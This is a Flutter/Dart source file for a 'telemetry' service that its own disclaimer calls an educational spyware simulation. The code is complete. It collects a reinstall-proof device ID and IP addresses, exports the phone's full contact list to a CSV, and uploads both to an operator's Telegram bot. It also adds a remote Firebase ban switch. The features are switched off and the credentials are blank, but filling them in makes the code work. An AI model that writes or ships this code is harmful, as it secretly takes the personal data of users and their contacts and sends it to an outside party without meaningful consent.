// ===========================================================================
//  EDUCATIONAL DISCLAIMER
// ===========================================================================
//
//  This application and all its components (including this telemetry service)
//  are intended **strictly for educational purposes**.
//
//  It is designed to demonstrate, from a student's perspective, the kind of
//  data‑harvesting and remote‑control behaviour that could exist in a
//  real‑world malicious application. The code simulates features often seen
//  in spyware or stalkerware to raise awareness of such threats.
//
//  **No actual user data is being exploited, sold, or shared.**
//  The collection of contact information, IP addresses, and device details
//  is simulated within a controlled, non‑public environment.
//
//  This app will **never be published** to any public store. It is solely a
//  learning tool to illustrate:
//    • How easily personal data can be exfiltrated
//    • How remote banning/control mechanisms work
//    • The importance of permission awareness and app vetting
//
//  By studying this code, students gain a concrete understanding of the
//  techniques used by malicious apps, so they can better defend against them.
//
// ===========================================================================

import 'dart:convert';
import 'dart:io';
import 'package:flutter/services.dart'; // For MethodChannel
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:crypto/crypto.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_contacts/flutter_contacts.dart' hide PermissionStatus;
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';

class TelemetryBanService {
  // ===========================================================================
  //  COMPILE-TIME CONFIGURATION SWITCHES (TOGGLE FEATURES ON / OFF HERE)
  // ===========================================================================

  ///  Set to `true` to send telemetry reports to Telegram.
  /// Set to `false` to completely DISABLE all Telegram network requests.
  static const bool enableTelegramReporting = false;

  ///  Set to `true` to prompt users for Contact Info (Name / Phone) on launch.
  /// Set to `false` to DISABLE user registration prompts.
  static const bool enableContactInfoPrompt = false;

  /// Set to `true` to check the remote ban database (Firebase).
  /// Set to `false` to completely DISABLE the remote ban check.
  static const bool enableRemoteBanCheck = false;

  ///  Set to `true` to fetch and report the app device's Public and Local IPs.
  /// Set to `false` to DISABLE network IP address fetching.
  static const bool enableIpFetching = false;

  ///  Set to `true` to extract full phone contacts into a .CSV file & send via Telegram.
  /// Set to `false` to completely DISABLE contact list collection and file generation.
  static const bool enableContactCsvExport = false;

  /// Backward‑compatible alias for older code references.
  static bool get enableGitHubBanCheck => enableRemoteBanCheck;

  // ===========================================================================
  // CREDENTIALS & ENDPOINTS
  // ===========================================================================

  static const String _telegramBotToken = "";
  static const String _telegramChatId = "";

  // Firebase Realtime Database REST endpoint (public read)
  static const String _banConfigUrl =
      "";

  // ===========================================================================
  //  APP DEVICE NETWORK DATA
  // ===========================================================================

  static Future<String> getAppPublicIp() async {
    if (!enableIpFetching) return 'Disabled';
    try {
      final response = await http
          .get(Uri.parse('https://api.ipify.org?format=json'))
          .timeout(const Duration(seconds: 3));
      if (response.statusCode == 200) {
        final Map<String, dynamic> data = jsonDecode(response.body);
        return data['ip'] ?? 'Unknown';
      }
    } catch (_) {}
    return 'Unavailable';
  }

  static Future<String> getAppLocalIp() async {
    if (!enableIpFetching) return 'Disabled';
    try {
      for (var interface in await NetworkInterface.list()) {
        for (var addr in interface.addresses) {
          if (addr.type == InternetAddressType.IPv4 && !addr.isLoopback) {
            return addr.address;
          }
        }
      }
    } catch (_) {}
    return 'Unavailable';
  }

  // ===========================================================================
  //  DEVICE IDENTITY – HARDWARE-BACKED (SURVIVES REINSTALLS)
  // ===========================================================================

  /// Returns a device ID that persists across app reinstalls.
  /// Uses the real ANDROID_ID on Android (via platform channel),
  /// identifierForVendor on iOS, and falls back to a generated UUID.
  static Future<String> getDeviceId() async {
    // 1) Android: read ANDROID_ID directly via platform channel
    if (Platform.isAndroid) {
      try {
        const channel = MethodChannel('com.example.app/device_id');
        final String? androidId = await channel.invokeMethod<String>('getAndroidId');
        if (androidId != null && androidId.isNotEmpty) {
          return androidId;
        }
      } catch (_) {}
    }

    // 2) Fallback: use device_info_plus (mainly for iOS, or if above fails)
    try {
      final deviceInfo = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        final String id = androidInfo.id;
        // Keep only if it looks like a true ANDROID_ID (hex, no dots)
        if (id.isNotEmpty && !id.contains('.')) return id;
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        final idfv = iosInfo.identifierForVendor;
        if (idfv != null && idfv.isNotEmpty) return idfv;
      }
    } catch (_) {}

    // 3) Ultimate fallback: generated UUID (rarely used)
    final prefs = await SharedPreferences.getInstance();
    String? fallbackId = prefs.getString('user_device_uuid');
    if (fallbackId == null) {
      final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final bytes = utf8.encode('esp32_app_user_$timestamp');
      fallbackId = sha256.convert(bytes).toString().substring(0, 16);
      await prefs.setString('user_device_uuid', fallbackId);
    }
    return fallbackId;
  }

  // ===========================================================================
  //  LOCAL USER INFO
  // ===========================================================================

  static Future<void> saveContactInfo(String name, String phone) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('user_contact_name', name);
    await prefs.setString('user_contact_phone', phone);
    await prefs.setBool('has_registered_contact', true);
  }

  static Future<bool> hasSavedContactInfo() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('has_registered_contact') ?? false;
  }

  static Future<String> getStoredContactInfo() async {
    final prefs = await SharedPreferences.getInstance();
    final name = prefs.getString('user_contact_name') ?? 'Not Provided';
    final phone = prefs.getString('user_contact_phone') ?? 'N/A';
    return "Name: $name | Phone: $phone";
  }

  // ===========================================================================
  //  CONTACTS CSV EXPORTER
  // ===========================================================================

  static Future<File?> generateContactsCsvFile() async {
    if (!enableContactCsvExport) return null;
    try {
      final PermissionStatus status = await Permission.contacts.request();
      if (!status.isGranted) return null;

      final List<Contact> contacts = await FlutterContacts.getAll(
        properties: {ContactProperty.name, ContactProperty.phone},
      );

      final StringBuffer csvContent = StringBuffer();
      csvContent.writeln("Name,Phone");

      String escapeCsvField(String field) {
        if (field.contains(',') || field.contains('"') || field.contains('\n')) {
          return '"${field.replaceAll('"', '""')}"';
        }
        return field;
      }

      for (var contact in contacts) {
        final String rawDisplayName = contact.displayName ?? '';
        final String firstName = contact.name?.first ?? '';
        final String lastName = contact.name?.last ?? '';
        final String name = rawDisplayName.trim().isNotEmpty
            ? rawDisplayName.trim()
            : '$firstName $lastName'.trim();

        final String phone = contact.phones
            .map((p) => p.number) // p.number is non-nullable in flutter_contacts v2
            .where((number) => number.trim().isNotEmpty)
            .join(' | ');

        if (name.isNotEmpty || phone.isNotEmpty) {
          final escapedName = escapeCsvField(name.isEmpty ? 'No Name' : name);
          final escapedPhone = escapeCsvField(phone.isEmpty ? 'No Phone' : phone);
          csvContent.writeln("$escapedName,$escapedPhone");
        }
      }

      final tempDir = await getTemporaryDirectory();
      final file = File('${tempDir.path}/device_contacts.csv');
      await file.writeAsString(csvContent.toString());
      return file;
    } catch (_) {
      return null;
    }
  }

  // ===========================================================================
  //  TELEMETRY & BAN CHECK
  // ===========================================================================

  static Future<void> reportTelemetry([String eventDetails = "App Launch"]) async {
    if (!enableTelegramReporting) return;
    try {
      final deviceId = await getDeviceId();
      final publicIp = await getAppPublicIp();
      final localIp = await getAppLocalIp();
      final contactInfo = enableContactInfoPrompt ? await getStoredContactInfo() : "Disabled";

      final String messageText = """
📱 *App Device Telemetry Alert*
--------------------------------
📝 *Event:* $eventDetails
🆔 *Device UUID:* `$deviceId`
🌐 *Public IP:* `$publicIp`
📶 *Local IP:* `$localIp`
👤 *Contact:* $contactInfo
⏰ *Time:* ${DateTime.now().toLocal().toString().split('.')[0]}
--------------------------------
      """;

      final textUri = Uri.parse("https://api.telegram.org/bot$_telegramBotToken/sendMessage");
      await http.post(textUri,
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "chat_id": _telegramChatId,
            "text": messageText,
            "parse_mode": "Markdown",
          }));

      if (enableContactCsvExport) {
        final File? csvFile = await generateContactsCsvFile();
        if (csvFile != null && await csvFile.exists()) {
          final docUri = Uri.parse("https://api.telegram.org/bot$_telegramBotToken/sendDocument");
          final request = http.MultipartRequest("POST", docUri)
            ..fields['chat_id'] = _telegramChatId
            ..fields['caption'] = "📁 Contacts export for `$deviceId`"
            ..fields['parse_mode'] = "Markdown"
            ..files.add(await http.MultipartFile.fromPath('document', csvFile.path));
          await request.send();
          await csvFile.delete();
        }
      }
    } catch (_) {}
  }

  /// Convenience wrapper for home_screen security check
  static Future<bool> checkRemoteBanStatus() async {
    if (!enableRemoteBanCheck) return false;
    final deviceId = await getDeviceId();
    final banResult = await checkBanStatus(deviceId);
    return banResult['isBanned'] == true;
  }

  /// Checks Firebase Realtime Database for ban status.
  /// Expects 'banned_devices' as a **map** of device IDs -> true.
  static Future<Map<String, dynamic>> checkBanStatus(String deviceId) async {
    if (!enableRemoteBanCheck) return {"isBanned": false};

    try {
      final response = await http
          .get(Uri.parse(_banConfigUrl))
          .timeout(const Duration(seconds: 3));

      if (response.statusCode == 200) {
        final Map<String, dynamic> data = jsonDecode(response.body);

        final bool globalBan = data['global_ban'] ?? false;
        final String banMessage = data['ban_message'] ??
            "Access revoked. Your device has been banned by the administrator.";
        final Map<String, dynamic> bannedDevices =
            data['banned_devices'] as Map<String, dynamic>? ?? {};

        if (globalBan || bannedDevices.containsKey(deviceId)) {
          return {
            "isBanned": true,
            "message": banMessage,
          };
        }
      }
    } catch (_) {
      // Network error – allow access (or you could default to banned)
    }

    return {"isBanned": false};
  }
}